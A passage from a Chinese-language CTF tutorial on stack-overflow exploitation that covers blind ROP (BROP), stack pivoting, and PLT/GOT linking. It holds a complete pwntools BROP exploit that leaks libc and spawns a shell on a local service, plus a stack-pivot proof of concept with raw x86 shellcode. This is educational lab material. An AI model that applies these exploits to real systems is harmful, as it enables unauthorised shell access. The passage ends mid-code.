system, execve等函数)的地址信息了, 在这一步可以拼凑出payload进行攻击.</p></li></ol><h4 id="使用例子">③ 使用例子</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2016 HCTF PWN题</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">truesetbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line">truesetbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line">truesetbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"WelCome my friend,Do you know password?"</span>);</span><br><span class="line">true<span class="keyword">if</span>(!check())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Do not dump my memory"</span>);</span><br><span class="line">true&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"No password, no game"</span>);</span><br><span class="line">true&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(buf,<span class="string">"aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk"</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./brop')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbufferflow_length</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">'WelCome my friend,Do you know password?\n'</span>)</span><br><span class="line">            sh.send(i * <span class="string">'a'</span>)</span><br><span class="line">            output = sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">'No password'</span>):</span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(length)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">            payload = <span class="string">'a'</span> * length + p64(addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">print</span> content</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'one success stop gadget addr: 0x%x'</span> % (addr)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_gadget</span><span class="params">(csu_last, csu_middle, saved_addr, arg1=<span class="number">0x0</span>, arg2=<span class="number">0x0</span>, arg3=<span class="number">0x0</span>)</span>:</span></span><br><span class="line">    payload = p64(csu_last)  <span class="comment"># pop rbx,rbp,r12,r13,r14,r15, ret</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>)  <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">0x1</span>)  <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(saved_addr)  <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)  <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)  <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)  <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += p64(csu_middle)  <span class="comment"># will call [rbx + r12 * 0x8]</span></span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">56</span>  <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_brop_gadget</span><span class="params">(length, stop_gadget, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(</span><br><span class="line">            stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">print</span> content</span><br><span class="line">        <span class="comment"># stop gadget returns memory</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">'WelCome'</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_brop_gadget</span><span class="params">(length, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + <span class="string">'a'</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_brop_gadget</span><span class="params">(length, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400740</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'possible brop gadget: 0x%x'</span> % addr</span><br><span class="line">            <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'success brop gadget: 0x%x'</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span><span class="params">(length, rdi_ret, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'A'</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">'\x7fELF'</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'find puts@plt addr: 0x%x'</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(length, rdi_ret, puts_plt, leak_addr, stop_gadget)</span>:</span></span><br><span class="line">    sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">"\nWelCome"</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">""</span>:</span><br><span class="line">            data = <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakfunction</span><span class="params">(length, rdi_ret, puts_plt, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data</span><br><span class="line">            addr += len(data)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'code'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment"># stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment"># brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment"># puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line"><span class="comment"># leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">'\nWelCome'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="x40-高级rop">0x40 高级ROP</h2><h3 id="x41-ret2_dl_runtime_resolve">0x41 ret2_dl_runtime_resolve</h3><hr><h2 id="x50-花式rop">0x50 花式ROP</h2><h3 id="x51-stack-pivoting">0x51 stack pivoting</h3><h4 id="使用原理-3">① 使用原理</h4><p>Stack pivoting 劫持栈指针, 目的是将栈劫持到攻击者能够控制的内存上去, 再做ROP. 原理如下:</p><div style="text-align: center;"><figure><img src="/2019/06/06/1.2-菜鸟学PWN之栈溢出学习/15136516601572.jpg" alt="Stack Pivoting原理"><figcaption>Stack Pivoting原理</figcaption></figure></div><p>)</p><h4 id="使用情景">② 使用情景</h4><ol type="1"><li>可以控制的栈溢出字节数较少, 难以构造较长的ROP链(例如: 在<code>fgets()</code>或<code>read()</code>函数中添加了长度限制, 只能溢出很少字节)</li><li>开启了PIE(Position-Independent Executable), 无法获得栈地址. 此时就可以通过Stack pivot将栈劫持到能够控制的已知区域.</li><li>其他漏洞难以利用, stack pivot能够使得一些非栈溢出漏洞变成栈溢出漏洞.(例如: 将程序劫持到heap空间中)</li></ol><h4 id="使用要求">③ 使用要求</h4><ol type="1"><li><p>可以控制程序执行流: 可控内存, 位置已知, 有读写权. (例如: bss段, 至少还有4k[内存按页分配], 有读写权限; heap空间: 需要泄露堆地址)</p></li><li><p>可以控制rsp(esp)指针. (例如: <code>libc_csu_init</code>中的gadgets, 我们通过偏移即可控制rsp指针<code>pop rsp</code>, 因为在x64系统中, 是通过寄存器来传参的)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/7i 0x000000000040061a</span><br><span class="line">0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx</span><br><span class="line">0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp</span><br><span class="line">0x40061c &lt;__libc_csu_init+92&gt;:  pop    r12</span><br><span class="line">0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13</span><br><span class="line">0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14</span><br><span class="line">0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15</span><br><span class="line">0x400624 &lt;__libc_csu_init+100&gt;: ret    </span><br><span class="line">gef➤  x/7i 0x000000000040061d</span><br><span class="line">0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp</span><br><span class="line">0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13</span><br><span class="line">0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14</span><br><span class="line">0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15</span><br><span class="line">0x400624 &lt;__libc_csu_init+100&gt;: ret</span><br></pre></td></tr></table></figure></li></ol><h4 id="使用例题-1">④ 使用例题</h4><ol type="1"><li><p>先查看保护:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  fancyROP checksec b0verfl0w</span><br><span class="line">[*] <span class="string">'/home/ks/ctf/pwn/stack/demo/fancyROP/b0verfl0w'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></li><li><p>再反汇编找到漏洞函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n======================"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nWelcome to X-CTF 2016!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n======================"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's your name?"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s."</span>, &amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面可以看到, 能够溢出的字节数有: <code>50 - 0x20 - 4 = 14</code>个字节, 很难执行一段较长的ROP, 这时就需要利用Stack pivot来控制<code>esp</code>. 由于堆栈保护都关了, 所以我们直接在栈上布置shellcode即可.</p></li><li><p>寻找gadgets:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  fancyROP ROPgadget --binary b0verfl0w --only &apos;jmp|ret&apos;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08048504 : jmp esp</span><br><span class="line">0x0804836a : ret</span><br><span class="line">0x0804847e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure></li><li><p>payload格式如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_shellcode|pedding|fake ebp|0x08048504|set esp point shell code and jmp esp</span><br></pre></td></tr></table></figure></li><li><p>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> disasm(shellcode_x86)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./b0verfl0w'</span>)</span><br><span class="line"><span class="comment"># sys_shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment"># print disasm(sys_shellcode)</span></span><br><span class="line">jmp_esp_addr = <span class="number">0x08048504</span></span><br><span class="line">sub_and_jmp_esp = asm(<span class="string">'sub esp, 0x28;jmp esp'</span>)</span><br><span class="line">payload = shellcode_x86.ljust(<span class="number">0x24</span>,<span class="string">'a'</span>) + p32(jmp_esp_addr) + sub_and_jmp_esp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="x52-frame-faking">0x52 frame faking</h3><h2 id="相关链接">相关链接</h2><ol type="1"><li>libc符号偏移查询站: http://libcdb.com/</li><li>libc符号偏移查询站: https://libc.blukat.me/</li><li>虚线画图在线工具: http://asciiflow.com/</li><li>libc github在线数据库: https://github.com/niklasb/libc-database</li><li>Linux程序常用保护机制: https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</li><li>Stack Pivot: http://tacxingxing.com/2017/05/10/stack-pivot/</li><li>PIE &amp;&amp; ALSR &amp;&amp; Bypass: http://tacxingxing.com/2017/07/15/pie-alsr/</li><li>Linux可执行文件之PLT&amp;GOT: http://www.ifuryst.com/archives/Linux-PLT-GOT.html</li></ol><h2 id="小记">小记</h2><h3 id="lea指令">1. lea指令</h3><p><code>lea, load effective address</code>, 加载有效地址. 指令形式是从存储器读数据到寄存器, 效果是将存储器的有效地址写入到目的操作数, 简单说, 就是C语言中的”&amp;”.</p><h3 id="查看libc版本">2. 查看libc版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ldd --version</span><br><span class="line">getconf GNU_LIBC_VERSION</span><br><span class="line">ls -l /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">ls -l /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">apt-cache show libc6</span><br></pre></td></tr></table></figure><p><strong>有 flush 函数，那就一定有 sh</strong>.</p><h3 id="linux动态链接之pltgot">3. Linux动态链接之PLT&amp;GOT</h3><p>链接过程无法修改编译过程生成的汇编指令, 那如何重定位?</p><blockquote><ul><li>需要存放外部函数的数据段</li><li>获取数据段存放函数地址的一小段额外代码</li></ul></blockquote><p><strong>链接器生成一段额外的小代码片段，通过这段代码支获取printf函数地址，并完成对它的调用。</strong></p><p>链接器生成额外的伪代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 